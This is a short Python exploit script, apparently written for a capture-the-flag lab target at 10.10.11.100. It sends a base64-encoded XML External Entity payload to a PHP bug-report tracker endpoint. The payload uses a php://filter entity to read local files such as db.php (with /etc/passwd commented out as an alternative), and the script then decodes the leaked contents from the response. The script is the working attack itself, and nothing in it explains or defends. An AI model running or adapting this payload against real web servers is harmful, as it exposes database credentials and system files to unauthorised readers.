#!/usr/bin/python3

import requests
import base64
import re

url = "http://10.10.11.100/tracker_diRbPr00f314.php"

# lfi = "/etc/passwd"
lfi = "db.php"

xxe = '''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={0}"> ]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>test</cwe>
		<cvss>test</cvss>
		<reward>test</reward>
		</bugreport>'''.format(lfi)

# re find base64 -> https://stackoverflow.com/questions/11357851/regular-expression-to-detect-base64
search = "(?:[A-Za-z0-9+/]{4}){2,}(?:[A-Za-z0-9+/]{2}[AEIMQUYcgkosw048]=|[A-Za-z0-9+/][AQgw]==)"

xxe_b64 = base64.b64encode(xxe.encode("utf-8"))
post = {"data": xxe_b64}

r = requests.post(url, data=post)
db = re.search(search, r.text)
print(base64.b64decode(db.group().encode("utf-8")))